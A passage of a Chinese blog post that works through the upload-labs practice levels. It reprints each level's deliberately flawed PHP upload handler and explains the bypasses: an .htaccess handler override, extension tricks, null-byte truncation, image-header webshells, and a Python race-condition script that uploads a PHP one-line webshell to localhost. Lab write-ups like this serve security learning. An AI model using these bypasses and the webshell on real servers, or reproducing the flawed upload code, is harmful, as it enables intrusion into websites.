参考文章:https://blog.spoock.com/2016/06/25/weakly-typed-security/","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"php","slug":"php","permalink":"https://blog.cfyqy.com/tags/php/"},{"name":"弱类型","slug":"弱类型","permalink":"https://blog.cfyqy.com/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"}],"author":"ye1s"},{"title":"文件上传解析漏洞总结","slug":"件上传漏洞整理","date":"2019-03-11T14:02:00.000Z","updated":"2021-01-05T03:09:16.795Z","comments":true,"path":"article/52a34cc3.html","link":"","permalink":"https://blog.cfyqy.com/article/52a34cc3.html","excerpt":"找到一个不错的文件上传练习项目，题型挺全面的，基本上可以概括所有的文件上传漏洞类型。随便总结一下，做个笔记。","text":"找到一个不错的文件上传练习项目，题型挺全面的，基本上可以概括所有的文件上传漏洞类型。随便总结一下，做个笔记。 附上一个项目地址:https://github.com/c0ny1/upload-labs在作者的思维脑图的基础上再进一步扩充。 js前端检测(1)禁用js。即可。在谷歌游览器中，设置-&gt;高级-&gt;内容-&gt;javascript。(2)用burp抓取数据包，修改成php后缀。 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 检查后缀黑名单检测特殊可解析后缀(1)通过上传特殊文件名来绕过黑名单检测。如 php、php2、php3、php5、phtml、asp、aspx、ascx、ashx、cer、jsp、jspx 这些特殊后缀名能否被解析,关键查看apache 的conf/httpd.conf文件 如果包含AddType application/x-httpd-php .php .phtml .phps .php5 .pht...则 .phtml……这些特殊文件可以被解析(2).htaccess绕过。这里因为文件名被重新命名了，所以绕过不了。这里就提一提。 先上传.htaccess文件，内容为 123&lt;FilesMatch \".(jpg)$\"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 然后再上传个shell.jpg ,这样shell.jpg就可解析为php文件。 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 正则匹配特性利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性 123双引号\" = 点号.大于符号&gt; = 问号?小于符号&lt; = 星号* 先上传一个名为script.php:.jpg的文件，上传成功后会生成script.php的空文件，大小为0KB然后将文件名改为script.&lt;或script.&lt;&lt;&lt;或script.&gt;&gt;&gt;或script.&gt;&gt;&lt;后再次上传，重写script.php文件内容，Webshell代码就会写入原来的script.php空文件中 这是网上找到的解法，不过还是不明白为什么上传的文件不会被重命名？？？？？？？？？？？？？？？？？？ 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 大小混写绕过发现后缀没有转化成大写或小写在判断，黑名单也过滤不完全。可以通过上传shell.phP绕过。 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 空格绕过没有用trim去除空格，.php空格 即可绕过黑名单检测。window下有效 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 点绕过没有去掉最后面的点，也没有重新命名文件。可以上传文件，用burp修改成shell.php.绕过。 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; ::$DATA绕过在上传文件保存磁盘为NTFS格式时可通过::$DATA绕过黑名单限制，如果上传的文件名字为：shell.php::$DATA，会在服务器上生成一个shell.php的文件，其中内容和所上传文件内容相同，并被解析 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 点+空格+点绕过deldot()只去除了最后一点，并且后面没有对文件进行重命名，所以我们可以shell.php. .绕过。 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 双写绕过str_ireplace()只过滤了一次，没有循环过滤。上传shell.phphpp即可绕过。 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 白名单检测MIME检测截断上传数据包，修改Content-Type为image/gif，然后放行数据包 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; get 00截断00截断要满足两个条件:php版本小于5.3.4php的magic_quotes_gpc为OFF状态(这个特性在PHP5.3.0中已经废弃并且在5.4.0中已经移除了)发现save_path参数是可以控制的,直接采用00截断 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; post 00截断因为post不会像get对%00进行解码。所以我要burp url-decode解码一下再发送. 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 0x00截断(1)上传的文件名用0x00绕过。改成19.php【二进制00】.1.jpg 同上 (2)或者move_uploaded_file会忽略掉文件末尾的/. 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传出错！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 检查内容文件头检查绕过文件头检查，添加GIF图片的文件头GIF89a，绕过GIF图片检查图片马即可绕过。 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; getimagesize添加GIF图片的文件头绕过检查图片马 12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; exif_imagetype同上 1234567891011121314151617181920212223242526272829303132333435function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 二次渲染原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片这篇文章写得挺完整的:https://xz.aliyun.com/t/2657 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125; 代码逻辑条件竞争利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。 附上大佬的脚本 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python# coding:utf-8# Build By LandGreyimport hackhttpfrom multiprocessing.dummy import Pool as ThreadPooldef upload(lists): hh = hackhttp.hackhttp() raw = \"\"\"POST /upload-labs/Pass-17/index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/upload-labs/Pass-17/index.phpCookie: pass=17Connection: closeUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=---------------------------6696274297634Content-Length: 341-----------------------------6696274297634Content-Disposition: form-data; name=\"upload_file\"; filename=\"17.php\"Content-Type: application/octet-stream&lt;?php assert($_POST[\"LandGrey\"])?&gt;-----------------------------6696274297634Content-Disposition: form-data; name=\"submit\"上传-----------------------------6696274297634--\"\"\" code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-17/index.php', raw=raw) print(str(code) + \"\\r\")pool = ThreadPool(10)pool.map(upload, range(10000))pool.close()pool.join() 在脚本运行的时候，访问Webshell 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 条件竞争和Apache解析漏洞不懂 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//index.php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125;//myupload.phpclass MyUpload&#123;.................. var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); &#125;.................. &#125;; 数组+./绕过参考网上的解:如果上传的是数组就会跳过$file = explode(&#39;.&#39;, strtolower($file)) 。而最终的文件名后缀取的是$file[count($file) - 1]，因此我们可以让$file为数组。$file[0]=test.php/ $file[2]=jpg 利用move_uploaded_file会忽略/.来成功绕过 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file']))&#123; //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"禁止上传该类型文件!\"; &#125;else&#123; //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"禁止上传该后缀文件!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"文件上传成功！\"; $is_upload = true; &#125; else &#123; $msg = \"文件上传失败！\"; &#125; &#125; &#125;&#125;else&#123; $msg = \"请选择要上传的文件！\";&#125; 